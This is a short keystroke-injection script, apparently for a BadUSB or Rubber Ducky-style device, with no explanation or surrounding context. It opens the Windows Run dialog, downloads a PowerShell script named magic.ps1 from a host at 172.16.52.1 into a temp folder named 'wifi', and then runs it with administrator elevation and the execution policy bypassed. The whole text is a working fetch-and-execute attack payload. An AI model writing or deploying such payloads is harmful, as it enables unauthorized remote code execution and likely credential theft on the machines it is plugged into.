DELAY 1000
windows r
DELAY 1000
STRINGLN cmd /c mkdir "%TEMP%\wifi" 2>nul & curl -o "%TEMP%\wifi\magic.ps1" http://172.16.52.1:42/files/magic.ps1
DELAY 1000
windows r
DELAY 1000
STRINGLN powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -ExecutionPolicy Bypass -Command & \"%TEMP%\wifi\magic.ps1\"'"
